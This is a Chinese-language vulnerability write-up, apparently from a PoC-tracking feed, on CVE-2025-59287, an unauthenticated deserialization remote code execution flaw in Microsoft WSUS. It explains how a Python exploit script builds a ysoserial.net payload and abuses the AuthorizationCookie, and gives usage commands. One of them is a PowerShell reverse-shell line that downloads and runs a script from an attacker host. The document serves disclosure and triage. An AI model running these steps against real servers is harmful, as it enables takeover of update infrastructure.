## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 远程代码执行 (RCE) - 不安全的反序列化

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 远程代码执行 (RCE) - 不安全的反序列化

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2025, Windows Server 2022, Windows Server 2019

**利用条件:** 无需认证，远程网络访问

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-59287是一个针对Microsoft Windows Server Update Services (WSUS) 组件的高危远程代码执行（RCE）漏洞，其根本原因是服务端存在不安全的反序列化设计缺陷。攻击者无需任何身份凭证，即可通过网络远程触发该漏洞，实现对目标服务器的完全控制。

POC有效性分析：
提供的Python POC脚本（CVE-2025-59287.py）旨在利用此高危漏洞。该漏洞源于WSUS在处理AuthorizationCookie时，使用.NET的BinaryFormatter等传统序列化机制进行不安全的对象反序列化。脚本通过自动化多个步骤来完成攻击：
1.  **载荷生成**：脚本首先调用外部工具ysoserial.net来生成一个恶意反序列化载荷。它指定了DataSet gadget并采用SoapFormatter格式。ysoserial.net是一个业界广泛使用的工具，用于生成各种.NET反序列化载荷，这使得脚本能够动态地构造用于远程代码执行的Payload。脚本包含了对ysoserial.net执行过程的错误处理和输出验证。
2.  **认证Cookie获取**：脚本向目标WSUS服务器的`/SimpleAuthWebService/SimpleAuth.asmx`接口发送SOAP请求，以获取一个有效的AuthorizationCookie。尽管该漏洞是未经身份验证的，但获取此Cookie是构建后续恶意请求的关键步骤。
3.  **漏洞利用**：在获取到认证Cookie并生成恶意载荷后，脚本会将含有恶意反序列化Payload的AuthorizationCookie嵌入到后续的SOAP请求中，发送至WSUS的某个脆弱服务接口（例如，通常是处理更新或报告的服务）。当WSUS服务器尝试反序列化这个特制的Cookie数据时，由于不安全的反序列化机制，恶意代码将被执行。该POC脚本的代码结构清晰，依赖标准Python库，并对ysoserial.net的调用进行了封装和验证，使其成为一个功能完整且高效的利用工具。

利用步骤：
1.  **环境准备**：攻击者需要一台可以访问目标WSUS服务器网络的机器，并在该机器上安装Python 3。同时，需要下载ysoserial.net工具（通常为ysoserial.exe），并确保其路径可供脚本访问。
2.  **运行POC**：通过命令行执行Python脚本，指定目标WSUS服务器的URL、希望在目标上执行的命令，以及ysoserial.net工具的路径。例如，要执行`calc.exe`：
    `python3 CVE-2025-59287.py --target https://[WSUS_SERVER_IP] --command "calc.exe" --ysoserial /path/to/ysoserial.exe`
    若要获取反向Shell，可以指定一个PowerShell命令：
    `python3 CVE-2025-59287.py --target https://[WSUS_SERVER_IP] --command "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]:8000/shell.ps1')\"" --ysoserial /path/to/ysoserial.exe`
3.  **验证**：如果漏洞利用成功，指定的命令将在WSUS服务器上以WSUS服务账户的权限执行。

投毒风险分析：
对提供的POC代码 (`CVE-2025-59287.py`) 的分析显示，该脚本的投毒风险评估为5%，属于极低风险。风险评估基于以下几点：
1.  **代码透明度与可读性**：脚本采用Python语言编写，代码结构清晰，逻辑简单明了，没有发现任何形式的代码混淆或加密，这大大降低了隐藏恶意行为的可能性。
2.  **标准库依赖**：脚本仅依赖于标准的Python库，如`requests`（用于HTTP请求）、`urllib3`（用于禁用SSL警告）、`subprocess`（用于执行外部命令）、`os`（用于文件系统操作）等。这些都是Python生态系统中广泛使用且经过充分审查的组件，本身不带有恶意功能。
3.  **外部工具调用合法性**：POC的核心部分是调用外部工具`ysoserial.net`。`ysoserial.net`是一个在.NET反序列化漏洞研究和利用领域被广泛认可和使用的合法工具。脚本对`ysoserial.net`的调用参数（`-g DataSet -f SoapFormatter -c command -o raw`）符合其标准用法，旨在生成用户指定的命令执行载荷。脚本中没有发现对该工具的非标准或可疑调用，也没有篡改其输出以插入额外恶意内容的迹象。
4.  **无恶意网络请求**：除了向目标WSUS服务器发起必要的SOAP请求以完成漏洞利用外，脚本没有向任何其他未知的或可疑的外部地址发起网络连接。所有网络流量都服务于漏洞利用过程。
5.  **用户可控的命令**：该POC脚本的一个关键特性是允许用户通过`--command`参数指定任意命令在目标服务器上执行。这意味着，如果在利用过程中执行了恶意命令，那是攻击者（或使用者）的主动行为，而非脚本作者在POC中预设的恶意功能。脚本本身不包含任何硬编码的恶意命令或后门。
**总结**：该POC代码表现出高度的透明度和符合防御性安全研究的规范。其低投毒风险主要归因于其开源、可读性强、对标准库的规范使用以及对知名安全工具的合理调用。在隔离环境中用于合法安全测试或研究，其安全性较高。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-59287
